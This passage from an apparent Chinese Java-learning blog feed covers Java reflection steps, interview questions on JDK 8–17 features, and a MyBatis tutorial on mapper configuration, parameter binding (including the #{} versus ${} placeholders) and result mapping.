<li>反射的应用3：调用指定的结构（重点）<br> 3.1 调用指定的属性（步骤）<br> 步骤1.通过Class实例调用getDeclaredField(String fieldName)，获取运行时类指定名的属性<br> 步骤2. setAccessible(true)：确保此属性是可以访问的<br> 步骤3. 通过Filed类的实例调用get(Object obj) （获取的操作）<br>             或 set(Object obj,Object value) （设置的操作）进行操作。<br> 3.2 调用指定的方法（步骤）<br> 步骤1.通过Class的实例调用getDeclaredMethod(String methodName,Class … args),获取指定的方法<br> 步骤2. setAccessible(true)：确保此方法是可访问的<br> 步骤3.通过Method实例调用invoke(Object obj,Object … objs),即为对Method对应的方法的调用。<br> invoke()的返回值即为Method对应的方法的返回值<br> 特别的：如果Method对应的方法的返回值类型为void，则invoke()返回值为null<br> 3.3 调用指定的构造器（步骤）<br> 步骤1.通过Class的实例调用getDeclaredConstructor(Class … args)，获取指定参数类型的构造器<br> 步骤2.setAccessible(true)：确保此构造器是可以访问的<br> 步骤3.通过Constructor实例调用newInstance(Object … objs),返回一个运行时类的实例。</li>
<li>反射的应用4：注解的使用（了解）</li>
<li>体会：反射的动态性</li>
</ol>
<h3 id="企业真题-4"><a href="#企业真题-4" class="headerlink" title="企业真题"></a>企业真题</h3><ol>
<li>对反射了解吗？反射有什么好处？为什么需要反射？（主要是反射的动态性）</li>
<li>反射的使用场合和作用、及其优缺点</li>
<li>实现Java反射的类有什么？</li>
<li>反射是怎么实现的？（从Class说起）</li>
<li>Class类的作用？生成Class对象的方法有哪些？(反射的源头。 主要有三种。)</li>
<li>Class.forName(“全路径”) 会调用哪些方法 ？ 会调用构造方法吗？加载的类会放在哪？<br>Class.forName() 会执行执行类构造器<code>&lt;clinit&gt;()</code>方法。不会调用构造方法加载的类放在方法区。</li>
<li>类加载流程（）</li>
<li>说一下创建对象的几种方法？（）<br><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240727171315.png" alt="创建对象的几种方法"></li>
<li>如何找到对象实际类的？（对象.getClass();）</li>
<li>Java反射创建对象效率高还是通过new创建对象的效率高？(new 的方式。)</li>
<li>如何利用反射机制来访问一个类的方法？<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">调用指定的方法（步骤）</span><br><span class="line">步骤1.通过Class的实例调用getDeclaredMethod(String methodName,Class ... args),获取指定的方法</span><br><span class="line">步骤2. setAccessible(true)：确保此方法是可访问的</span><br><span class="line">步骤3.通过Method实例调用invoke(Object obj,Object ... objs),即为对Method对应的方法的调用。</span><br><span class="line">    invoke()的返回值即为Method对应的方法的返回值</span><br><span class="line">    特别的：如果Method对应的方法的返回值类型为void，则invoke()返回值为null</span><br></pre></td></tr></table></figure></li>
<li>说一下Java反射获取私有属性，如何改变值？<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">调用指定的属性（步骤）</span><br><span class="line">步骤1.通过Class实例调用getDeclaredField(String fieldName)，获取运行时类指定名的属性</span><br><span class="line">步骤2. setAccessible(true)：确保此属性是可以访问的</span><br><span class="line">步骤3. 通过Filed类的实例调用get(Object obj) （获取的操作）</span><br><span class="line">                    或 set(Object obj,Object value) （设置的操作）进行操作。</span><br></pre></td></tr></table></figure>
针对于核心源码的api，内部的私有的结构在jdk17中就不可以通过反射调用了。</li>
</ol>
<h2 id="JDK8-17新特性"><a href="#JDK8-17新特性" class="headerlink" title="JDK8-17新特性"></a>JDK8-17新特性</h2><h3 id="知识点-8"><a href="#知识点-8" class="headerlink" title="知识点"></a>知识点</h3><ol>
<li>JDK新特性的概述<ul>
<li>几个重要的版本<ul>
<li>jdk 5.0 &#x2F; jdk 8.0 ：里程碑式的版本</li>
<li>jdk9.0 开始每6个月发布一个新的版本</li>
<li>LTS : jdk8 、 jdk 11 、 jdk 17</li>
</ul>
</li>
<li>如何学习新特性</li>
</ul>
</li>
<li>什么情况下可以使用lambda表达式<ul>
<li>在给函数式接口提供实例时，都可以考虑使用lambda表达式。</li>
<li>基本语法的使用（重要）</li>
</ul>
</li>
<li>函数式接口<ul>
<li>常见的函数式接口。Comparator \ Runnable \ java.util.function下定义的丰富的函数式接口</li>
<li>消费型接口：Consumer<T>     void accept(T t)</li>
<li>供给型接口：Supplier<T>     T get()</li>
<li>函数型接口：Function&lt;T,R&gt;   R apply(T t)</li>
<li>判断型接口：Predicate<T>    boolean test(T t)</li>
</ul>
</li>
<li>方法引用、构造器引用、数组引用<ul>
<li>方法引用、构造器引用、数组引用：看做是lambda表达式的进一步刻画、表达。</li>
<li>（掌握）方法引用、构造器引用、数组引用的使用场景。</li>
</ul>
</li>
<li>JDK8:Stream API的使用<ul>
<li>Stream关注于内存中的多个数据的运算。</li>
<li>使用步骤：① Stream 的实例化 ② 一系列的中间操作 ③ 终止操作</li>
</ul>
</li>
<li>JDK8之后的新特性：语法层面<ul>
<li>jShell工具</li>
<li>try-catch结构的变化。try(…){ }</li>
<li>局部变量的类型推断：var</li>
<li>instanceof的模式匹配</li>
<li>switch表达式、switch的模式匹配</li>
<li>文本块的使用：”””文本块”””</li>
<li>新的引用数据类型：record (记录)</li>
<li>密封类：sealed class</li>
</ul>
</li>
<li>JDK8之后的新特性：其它<ul>
<li>Optional类的使用</li>
<li>其他：了解</li>
</ul>
</li>
</ol>
<h3 id="真题"><a href="#真题" class="headerlink" title="真题"></a>真题</h3><ol>
<li>谈谈java8新特性<ul>
<li>lambda表达式、Stream API</li>
<li>jdk7的对比：元空间、HashMap、新的日期时间API、接口变化等。</li>
</ul>
</li>
<li>JDK1.8在数据结构上发生了哪些变化 ？<ul>
<li>使用元空间替代永久代。  （方法区：jvm规范中提到的结构。  <ul>
<li>HotSpot来讲，jdk7：方法区的落地体现：永久代。 jdk8：方法区的落地体现：元空间。</li>
</ul>
</li>
<li>HashMap底层结构</li>
</ul>
</li>
<li>你说的了解 Java的新特性 ，你说说JDK8改进的地方？</li>
<li>JDK1.8用的是哪个垃圾回收器？</li>
</ol>
<ul>
<li>Parallel GC –&gt; jdk9：默认使用G1GC  –&gt; ZGC</li>
</ul>
<ol start="5">
<li>Lambda表达式有了解吗，说说如何使用的</li>
<li>什么是函数式接口？有几种函数式接口<br>java.util.function包下定义了丰富的好函数式接口。有4类基础的函数式接口：<br>消费型接口：Consumer<T>     void accept(T t)<br>供给型接口：Supplier<T>     T get()<br>函数型接口：Function&lt;T,R&gt;   R apply(T t)<br>判断型接口：Predicate<T>    boolean test(T t)</li>
<li>创建Stream的方式：三种。</li>
<li>你讲讲stream表达式是咋用的，干啥的？</li>
</ol>
<ul>
<li>Stream API 关注的是多个数据的计算（排序、查找、过滤、映射、遍历等），面向CPU的。<br>集合关注的数据的存储，面向内存的。</li>
<li>Stream API 之于集合，类似于SQL之于数据表的查询。</li>
</ul>
<ol start="9">
<li>集合用Stream流怎么实现过滤？<br> filter(Predicate predicate)</li>
<li>用Stream怎么选出List里想要的数据？</li>
<li>说说JDK15、JDK16、JDK17中的新特性都有什么？</li>
</ol>
]]></content>
      <categories>
        <category>Java</category>
        <category>基础</category>
      </categories>
      <tags>
        <tag>Java基础</tag>
      </tags>
  </entry>
  <entry>
    <title>Java-SSM-MyBatis</title>
    <url>/2024/12/21/Java-SSM-MyBatis/</url>
    <content><![CDATA[<h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>MyBatis 是一款优秀的持久层框架，它支持自定义 SQL、存储过程以及高级映射。MyBatis 免除了几乎所有的JDBC 代码以及设置参数和获取结果集的工作。MyBatis 可以通过简单的 XML 或注解来配置和映射原始类型、接口和 Java POJO（Plain Old Java Objects，普通老式 Java 对象）为数据库中的记录。</p>
<h2 id="持久层框架对比"><a href="#持久层框架对比" class="headerlink" title="持久层框架对比"></a>持久层框架对比</h2><ul>
<li><p>JDBC</p>
<ul>
<li><p>SQL 夹杂在Java代码中耦合度高，导致硬编码内伤</p>
</li>
<li><p>维护不易且实际开发需求中 SQL 有变化，频繁修改的情况多见</p>
</li>
<li><p>代码冗长，开发效率低</p>
</li>
</ul>
</li>
<li><p>Hibernate 和 JPA</p>
<ul>
<li>操作简便，开发效率高</li>
<li>程序中的长难复杂 SQL 需要绕过框架</li>
<li>内部自动生成的 SQL，不容易做特殊优化</li>
<li>基于全映射的全自动框架，大量字段的 POJO 进行部分映射时比较困难。</li>
<li>反射操作太多，导致数据库性能下降</li>
</ul>
</li>
<li><p>MyBatis</p>
<ul>
<li>轻量级，性能出色</li>
<li>SQL 和 Java 编码分开，功能边界清晰。Java代码专注业务、SQL语句专注数据</li>
<li>开发效率稍逊于 Hibernate，但是完全能够接收</li>
</ul>
</li>
</ul>
<p>开发效率：Hibernate&gt;Mybatis&gt;JDBC</p>
<p>运行效率：JDBC&gt;Mybatis&gt;Hibernate</p>
<hr>
<h2 id="入门案例"><a href="#入门案例" class="headerlink" title="入门案例"></a>入门案例</h2><p>见【实践-实践1 引入实践】</p>
<hr>
<h2 id="Ibatis工作方式与原理"><a href="#Ibatis工作方式与原理" class="headerlink" title="Ibatis工作方式与原理"></a>Ibatis工作方式与原理</h2><p>Ibatis是MyBatis的前身，Mybatis即为Ibatis3。MyBatis进行数据库crud操作是对Ibatis的封装。</p>
<p>Ibatis方式进行数据库操作：</p>
<ol>
<li>无需创建接口，直接创建mapper.xml文件并在内部撰写SQL语句</li>
<li>namespace无要求，可随意声明一个字符串。</li>
<li>内部通过crud对应标签（包括<code>&lt;select&gt;&lt;/select&gt;</code>等）声明SQL语句。</li>
<li>mapperConfig文件正常编写。</li>
<li>使用时有所不同，见实践1 - 编写测试。</li>
</ol>
<p>原理简述：我们在mapper.xml中编写SQL语句，并在mybatis-config.xml配置文件中配置之后，SqlSessionFactory会读取配置文件，存储数据库信息和功能开关，并将mapper.xml文件中标签id属性作为key值，标签内SQL语句作为value值，存储在Map中。当我们通过sqlSession进行数据库操作时，需要填写id参数和SQL语句传入参数，sqlSession会将id和SQL传入参数交给SqlSessionFactory，由它通过id值查找到对应的SQL语句，并结合参数执行。</p>
<blockquote>
<p>AI介绍：在应用启动时，<code>SqlSessionFactory</code> 通过读取 <code>mybatis-config.xml</code> 配置文件和关联的 <code>mapper.xml</code> 文件进行初始化，解析并注册 SQL 映射语句。当执行数据库操作时，开发者通过 <code>sqlSession</code> 调用 Mapper 接口的方法，MyBatis 根据方法签名找到对应的 SQL 语句，处理参数绑定、动态 SQL 构建，并通过 JDBC 执行 SQL。查询结果会被映射到 Java 对象中返回给调用者。整个过程中，MyBatis  还支持一级和二级缓存以提高性能，并提供事务管理功能确保数据的一致性。</p>
</blockquote>
<p>Ibatis存在的缺陷：</p>
<blockquote>
<ol>
<li>参数1（标签id） 很容易写错</li>
<li>sql语句参数只能传递一个，如果多个参数需要整合。</li>
<li>返回值需要自己指定，不会提示。</li>
</ol>
</blockquote>
<hr>
<h2 id="MyBatis工作方式和原理"><a href="#MyBatis工作方式和原理" class="headerlink" title="MyBatis工作方式和原理"></a>MyBatis工作方式和原理</h2><p>MyBatis在Ibatis基础上进行封装优化，解决上述缺陷。</p>
<p>MyBatis原理简述：MyBatis需要定义 Mapper 接口，对于每个 Mapper 接口，MyBatis 使用 JDK 的 <code>Proxy.newProxyInstance()</code> 方法或者 CGLIB 来创建其代理类。当我们通过接口调用其中的方法进行数据库操作时，就会触发代理逻辑，动态代理类会拦截方法调用，然后拼接接口的全限定名和调用方法名，从而找到对应的 XML 映射文件对应id的标签。因此我们在编写SQL语句的XML文件的namespace属性下需要写明其对应接口的全限定符，而标签id必须是标签对应的方法名。同时如果传入的SQL语句参数为多个，MyBatis还会将参数整合为一个，最后再交由上述Ibatis机制处理。</p>
<blockquote>
<p>AI介绍：MyBatis 通过定义 Mapper 接口与 XML 映射文件（或注解）相结合的方式简化了数据库操作。每个 Mapper 接口对应一个 XML 文件，在其中 <code>&lt;mapper&gt;</code> 标签的 <code>namespace</code> 属性值必须匹配接口的全限定名。当应用程序调用 Mapper 接口的方法时，MyBatis 使用 JDK 动态代理（对于接口）或  CGLIB（对于非接口类）创建代理对象。这个代理对象会拦截方法调用，利用接口的全限定名和方法签名（包括名称和参数类型）作为键查找预先解析并缓存的 SQL 语句配置，将传入的参数适配到 SQL 中，并执行相应的数据库操作。MyBatis 能够智能地处理各种类型的参数，无论是单个值、Java Bean、Map 还是多个参数，都会被正确地映射到 SQL 语句中的占位符。查询结果则会被自动映射回 Java  对象，从而实现了从数据层到业务逻辑层的无缝集成。整个过程无需开发者直接管理 JDBC 资源，大大提高了开发效率和代码的可维护性。</p>
</blockquote>
<hr>
<h2 id="笔记说明"><a href="#笔记说明" class="headerlink" title="笔记说明"></a>笔记说明</h2><h3 id="笔记平台"><a href="#笔记平台" class="headerlink" title="笔记平台"></a>笔记平台</h3><p>（1）IDEA开发工具：2022.1.2<br>（2）JDK：Java17<strong>（Spring6要求JDK最低版本是Java17）</strong><br>（3）Spring：6.0.2</p>
<p>（4）Maven：3.6+</p>
<h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><p><strong>主要参考资料：</strong></p>
<p><a href="https://www.bilibili.com/video/BV1AP411s7D7/?spm_id_from=333.1387.search.video_card.click&vd_source=20530c92c1be8bd70e37346e3a5c037a">尚硅谷-SSM</a></p>
<p><a href="https://mybatis.org/mybatis-3/">MyBatis官方文档</a></p>
<p><strong>其他参考资料：</strong></p>
<p><a href="https://www.bilibili.com/video/BV1mW411M737/">尚硅谷MyBatis实战教程全套完整版(初学者零基础从入门到精通,好评如潮,资料齐全)</a></p>
<p><a href="https://www.bilibili.com/video/BV1VP4y1c7j7/">【尚硅谷】MyBatis零基础入门教程（细致全面，快速上手mybatis）</a></p>
<hr>
<h1 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h1><h2 id="常见配置"><a href="#常见配置" class="headerlink" title="常见配置"></a>常见配置</h2><p>建议参考<a href="https://mybatis.org/mybatis-3/configuration.html">官方文档</a>。</p>
<p><strong>开启MySQL日志控制台输出</strong></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">settings</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--开启MyBatis日志控制台输出--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">setting</span> <span class="attr">name</span>=<span class="string">&quot;logImpl&quot;</span> <span class="attr">value</span>=<span class="string">&quot;STDOUT_LOGGING&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">settings</span>&gt;</span></span><br></pre></td></tr></table></figure>



<h3 id="mapper-xml模板"><a href="#mapper-xml模板" class="headerlink" title="mapper.xml模板"></a>mapper.xml模板</h3><p>文件-设置-编辑器-文件和代码模板-文件-[扩展:xml；启用实时模板]</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span> ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">mapper</span></span></span><br><span class="line"><span class="meta">        <span class="keyword">PUBLIC</span> <span class="string">&quot;-//mybatis.org//DTD Mapper 3.0//EN&quot;</span></span></span><br><span class="line"><span class="meta">        <span class="string">&quot;https://mybatis.org/dtd/mybatis-3-mapper.dtd&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- namespace = mapper接口类的全限定名 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">mapper</span> <span class="attr">namespace</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">mapper</span>&gt;</span></span><br></pre></td></tr></table></figure>



<h2 id="取值符号-和-的区别"><a href="#取值符号-和-的区别" class="headerlink" title="取值符号#和$的区别"></a>取值符号#和$的区别</h2><p>符号均可用于在Mapper.xml文件中的SQL语句中承接传入的外部参数。<code>&#123;&#125;</code>中的<code>key</code>取决于传入的是单值类型还是多值类型，详情见下文</p>
<p><code>#&#123;key&#125;</code>：<strong>推荐使用</strong>。底层进行的是赋值操作。<strong>只能存储列数据值</strong>，不能存储列名，表名等。可以避免注入攻击。key</p>
<blockquote>
<p>如：where emp_id &#x3D; #{id}。底层进行的是 emp_id  &#x3D;  ? ; ? &#x3D; id(传入的参数。)</p>
</blockquote>
<p><code>$&#123;key&#125;</code>：不推荐使用。底层进行的是字符串拼接操作。可以存储储列数据值，列名，表名等。不能避免注入攻击。</p>
<blockquote>
<p>如：where emp_id &#x3D; #{id}。底层进行的是 “emp_id  &#x3D;” + “id”</p>
<p>如果列名也不确定，只能使用此方法，如：where ${key} &#x3D; #{id}.</p>
</blockquote>
<p>SQL语句编写示例：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;queryById&quot;</span> <span class="attr">resultType</span>=<span class="string">&quot;com.fu.pojo.Employee&quot;</span>&gt;</span></span><br><span class="line">    select emp_id empId,emp_name empName,emp_salary emaSalary</span><br><span class="line">        from t_emp where emp_id = #&#123;id&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>使用示例：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">testSelectEmployee</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">mybatisConfigFilePath</span> <span class="operator">=</span> <span class="string">&quot;mybatis-config.xml&quot;</span>;</span><br><span class="line">        <span class="comment">// ... 省略</span></span><br><span class="line">        <span class="type">Employee</span> <span class="variable">employee</span> <span class="operator">=</span> employeeMapper.queryById(<span class="number">1</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;employee = &quot;</span> + employee);</span><br><span class="line">        <span class="comment">// ... 省略</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>



<hr>
<h2 id="数据输入"><a href="#数据输入" class="headerlink" title="数据输入"></a>数据输入</h2><h3 id="（简单）单值类型"><a href="#（简单）单值类型" class="headerlink" title="（简单）单值类型"></a>（简单）单值类型</h3><p>包括：</p>
<ul>
<li>基本数据类型：int、byte、short、double、……</li>
<li>基本数据类型的包装类型：Integer、Character、Double、……</li>
<li>字符串类型：String</li>
</ul>
<p><code>&#123;&#125;</code>中的<code>key</code>可以是任意字符，仅作占位，无实际意义，但为了方便程序员查看，一般使用符合SQL语句语境的单词。</p>
<h3 id="（复杂）多值类型"><a href="#（复杂）多值类型" class="headerlink" title="（复杂）多值类型"></a>（复杂）多值类型</h3><p>包括：</p>
<ul>
<li><p><code>实体类类型</code>：Employee、Department、……</p>
<blockquote>
<p> key必须为实体类成员变量（即属性）！</p>
</blockquote>
</li>
<li><p><code>集合类型</code>：List、Set、Map、……</p>
<blockquote>
<p>传入多个单值类型：</p>
<p>​	方案1: 注解指定，在接口方法的每个参数前添加@Param(“name”)注解，<br>​            	SQL中key与对应参数注解中的”name”必须相等，即key &#x3D; name.</p>
<p>​	方案2：MyBatis默认机制，按参数顺序，两种方式</p>
<p>​			第一个传入参数的key值为 arg0 以此类推。</p>
<p>​			第一个传入参数的key值为 param1 以此类推</p>
<p>传入map类型：</p>
<p>​	key &#x3D; map的key值</p>
</blockquote>
</li>
<li><p><code>数组类型</code>：int[]、String[]、……</p>
<blockquote>
<p>待定，见下文集合遍历</p>
</blockquote>
</li>
<li><p><code>复合类型</code>：List<Employee>、实体类中包含集合……</p>
<blockquote>
</blockquote>
</li>
</ul>
<p><strong>SQL编写示例：</strong></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 1. 传入的是一个实体对象：</span></span><br><span class="line"><span class="comment">        key必须填写实体类的属性名，如Employee类中属性empName.</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">insert</span> <span class="attr">id</span>=<span class="string">&quot;insertEmp&quot;</span>&gt;</span></span><br><span class="line">    insert into t_emp (emp_name, emp_salary) values(#&#123;empName&#125;,#&#123;empSalary&#125;);</span><br><span class="line"><span class="tag">&lt;/<span class="name">insert</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 2. 传入多个简单类型：</span></span><br><span class="line"><span class="comment">        方案1(推荐): 注解指定，在接口方法的每个参数前添加@Param(&quot;name&quot;)注解，</span></span><br><span class="line"><span class="comment">              SQL中key与对应参数注解中的&quot;name&quot;必须相等，即key = name.</span></span><br><span class="line"><span class="comment">        方案2：MyBatis默认机制，按参数顺序，两种方式</span></span><br><span class="line"><span class="comment">                第一个传入参数的key值为 arg0 以此类推。</span></span><br><span class="line"><span class="comment">                第一个传入参数的key值为 param1 以此类推</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;queryByNameAndSalary&quot;</span>&gt;</span></span><br><span class="line">    select emp_id empId,emp_name empName,emp_salary emaSalary</span><br><span class="line">        from t_emp where emp_name = #&#123;Name&#125; and emp_salary = #&#123;Salary&#125;</span><br><span class="line">    <span class="comment">&lt;!-- from t_emp where emp_name = #&#123;arg0&#125; and emp_salary = #&#123;arg1&#125; --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- from t_emp where emp_name = #&#123;param1&#125; and emp_salary = #&#123;param1&#125; --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 3. 传入map类型数据</span></span><br><span class="line"><span class="comment">           key = map的key</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">insert</span> <span class="attr">id</span>=<span class="string">&quot;insertEmpMap&quot;</span>&gt;</span></span><br><span class="line">    insert into t_emp (emp_name, emp_salary) values(#&#123;Name&#125;,#&#123;Salary&#125;);</span><br><span class="line">    <span class="comment">&lt;!--假设map的key值为Name和Salary--&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">insert</span>&gt;</span></span><br></pre></td></tr></table></figure>



<p><strong>接口方法：</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 插入员工数据 ==》 传入参数是实体类</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">insertEmp</span><span class="params">(Employee employee)</span>;</span><br><span class="line"><span class="comment">// 根据员工名字和薪资查询 ==》 传入参数是</span></span><br><span class="line">List&lt;Employee&gt; <span class="title function_">queryByNameAndSalary</span><span class="params">(<span class="meta">@Param(&quot;Name&quot;)</span> String name, <span class="meta">@Param(&quot;Salary&quot;)</span> Double salary)</span>;</span><br><span class="line"><span class="comment">// 插入员工数据，传入的是Map类型数据，即name:值，salary:值</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">insertEmpMap</span><span class="params">(Map data)</span>;</span><br></pre></td></tr></table></figure>



<h2 id="数据输出"><a href="#数据输出" class="headerlink" title="数据输出"></a>数据输出</h2><p>如果是DML（插入、修改、删除）语句，返回值为 int</p>
<h3 id="（简单）单值类型-1"><a href="#（简单）单值类型-1" class="headerlink" title="（简单）单值类型"></a>（简单）单值类型</h3><p>标签中的<code>resultType</code>来指定返回值的类型，有两种方式：</p>
<ul>
<li>类的全限定符</li>
<li>类的别名<ul>
<li>MyBatis定义了72种常见数据类型（基本类型、包装类，集合类）的别名，一般为类名首字母小写，详情查看官方文档。</li>
<li>自定义类或非常见类可以采用下文方式定义别名。</li>
</ul>
</li>
</ul>
<p>SQL编写示例：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;queryNameById&quot;</span> <span class="attr">resultType</span>=<span class="string">&quot;java.lang.String&quot;</span>&gt;</span></span><br><span class="line">    select emp_name from t_emp where emp_id = #&#123;id&#125;;</span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>对应接口方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 如果是DML（插入、修改、删除）语句，返回值为 int</span></span><br><span class="line"><span class="comment">// 根据员工id查询员工姓名</span></span><br><span class="line">String <span class="title function_">queryNameById</span><span class="params">(Integer id)</span>;</span><br></pre></td></tr></table></figure>





<hr>
<h3 id="复杂（多值）类型"><a href="#复杂（多值）类型" class="headerlink" title="复杂（多值）类型"></a>复杂（多值）类型</h3><h4 id="单个实体类对象"><a href="#单个实体类对象" class="headerlink" title="单个实体类对象"></a>单个实体类对象</h4><p>默认情况：<strong>要求SQL查询语句中的列名（或别名）必须与实体类的属性名相同，才可以实现自动映射</strong>！</p>
<p><strong>驼峰自动映射</strong>：将数据库中按蛇形命名法命名的列名自动转为驼峰命名法的名称（去“_”并将其后首字母大写），以对应实体类对象属性名。<strong>设置方法：</strong>在mapper配置文件中，<code>settings</code>标签下添加子标签<code>setting</code>，并设置如下：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">settings</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--开启驼峰自动映射--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">setting</span> <span class="attr">name</span>=<span class="string">&quot;mapUnderscoreToCamelCase&quot;</span> <span class="attr">value</span>=<span class="string">&quot;true&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">settings</span>&gt;</span></span><br></pre></td></tr></table></figure>



<p>标签中的<code>resultType</code>来指定返回值的类型，有两种方式：</p>
<ul>
<li>类的全限定符</li>
<li>类的别名，别名设置见上文</li>
</ul>
<p>SQL编写示例：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 已开启驼峰命名映射和包下类别名--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;queryById&quot;</span> <span class="attr">resultType</span>=<span class="string">&quot;employee&quot;</span>&gt;</span></span><br><span class="line">    select * from t_emp where emp_id = #&#123;id&#125;;</span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>接口方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Employee <span class="title function_">queryById</span><span class="params">(Integer id)</span>;</span><br></pre></td></tr></table></figure>



<h4 id="Map"><a href="#Map" class="headerlink" title="Map"></a>Map</h4><p>没有实体类可以接收查询结果的时候，可以使用Map类接收</p>
<p>返回Map型数据时，map的key值即为SQL语句的列名，value即为查询结果</p>
<blockquote>
<p>注意！是编写在xml中的SQL语句查询哪些数据，其key值也就是哪些，并且只能查询返回一个值的数据。</p>
</blockquote>
<p>SQL编写示例：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- MyBatis常用类型Map别名map--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;queryNameAndMaxSalary&quot;</span> <span class="attr">resultType</span>=<span class="string">&quot;map&quot;</span>&gt;</span></span><br><span class="line">    select emp_name, emp_salary, (select avg(emp_salary) from t_emp)</span><br><span class="line">    from t_emp where emp_salary = (</span><br><span class="line">    select max(emp_salary) from t_emp</span><br><span class="line">    )</span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>接口方法示例：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 所有工资等于公司最高工资的员工的名字 (emp_name)、</span></span><br><span class="line"><span class="comment">// 他们的工资 (emp_salary) 以及公司所有员工的平均工资 (avg_salary)</span></span><br><span class="line">Map&lt;String,Object&gt; <span class="title function_">queryNameAndMaxSalary</span><span class="params">()</span>;</span><br></pre></td></tr></table></figure>

<p>使用示例：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Map&lt;String, Object&gt; map = employeeMapper.queryNameAndMaxSalary();</span><br><span class="line">System.out.println(map.get(<span class="string">&quot;emp_name&quot;</span>));</span><br></pre></td></tr></table></figure>



<h4 id="集合"><a href="#集合" class="headerlink" title="集合"></a>集合</h4><p><strong>返回值是集合型，不要指定为集合，指定为集合内指定的泛型即可！！！</strong>如List&lt;Employee&gt;指定为 employee</p>
<p>接口方法示例：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 查询所有员工工资大于？的员工名字</span></span><br><span class="line">List&lt;String&gt; <span class="title function_">queryNamesBySalary</span><span class="params">(Double Salary)</span>;</span><br><span class="line"><span class="comment">// 查询所有员工工资大于？的员工</span></span><br><span class="line">List&lt;Employee&gt; <span class="title function_">queryBySalary</span><span class="params">(Double Salary)</span>;</span><br></pre></td></tr></table></figure>

<p>SQL编写示例：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;queryNamesBySalary&quot;</span> <span class="attr">resultType</span>=<span class="string">&quot;string&quot;</span>&gt;</span></span><br><span class="line">    select emp_name from t_emp where emp_salary &gt; #&#123;s&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;queryBySalary&quot;</span> <span class="attr">resultType</span>=<span class="string">&quot;employee&quot;</span>&gt;</span></span><br><span class="line">    select * from t_emp where emp_salary &gt; #&#123;s&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure>

